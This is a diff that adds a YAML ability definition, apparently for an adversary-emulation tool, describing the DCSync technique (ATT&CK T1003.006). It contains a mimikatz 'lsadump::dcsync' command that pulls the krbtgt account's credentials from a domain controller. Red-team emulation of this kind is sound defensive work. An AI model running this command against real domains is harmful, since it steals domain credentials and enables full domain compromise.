@@ -1,0 +1,24 @@
+- description: 'Attack allowing retrieval of account information without accessing
+    memory or retrieving the NTDS database.
+
+    Works against a remote Windows Domain Controller using the replication protocol.
+
+    Privileges required: domain admin or domain controller account (by default), or
+    any other account with required rights.
+
+    [Reference](https://adsecurity.org/?p=1729)
+
+    '
+  id: ed866b709eacbfafe51ba5883f174587
+  name: DCSync
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: '%tmp%\mimikatz\x64\mimikatz.exe "lsadump::dcsync /domain:example.com
+          /user:krbtgt@example.com" "exit"'
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.006
+    name: 'OS Credential Dumping: DCSync'
